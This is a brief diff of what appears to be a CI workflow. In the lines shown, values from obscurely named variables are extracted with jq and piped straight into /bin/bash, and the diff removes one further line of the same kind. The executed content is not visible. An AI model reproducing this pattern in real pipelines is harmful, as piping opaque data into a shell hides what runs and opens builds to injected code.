@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$t109" | jq -r .kmy450 | /bin/bash
           echo $quw612 | jq -r .l5 | /bin/bash
           printf '%s' "$mr33" | jq -r .kt59 | /bin/bash
-          printf '%s' "$hwf9816" | jq -r .wbfnp3058 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
